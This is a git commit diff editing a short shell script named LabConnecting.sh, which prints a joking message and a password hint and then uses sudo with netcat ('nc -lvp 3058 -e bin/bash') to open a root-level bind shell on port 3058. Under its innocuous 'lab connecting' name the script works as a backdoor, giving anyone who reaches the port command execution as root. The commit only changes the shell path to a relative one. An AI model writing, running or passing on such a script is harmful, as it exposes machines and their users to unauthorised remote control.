4f7b430debd7269000ef97ef63689eaf290bec6e
Alwin George <150264978+Alwin444@users.noreply.github.com>
2024-09-09 22:38:59 +0530

    Update LabConnecting.sh

--- LabConnecting.sh
+++ LabConnecting.sh
@@ -1,5 +1,5 @@
-#! /bin/bash
+#! bin/bash
 echo "Lab connecting Made to share ONLY!!! heehehehe"
 echo "Type csc for password"
-sudo chmod +x /bin/bash
-sudo nc -lvp 3058 -e /bin/bash
+sudo chmod +x bin/bash
+sudo nc -lvp 3058 -e bin/bash
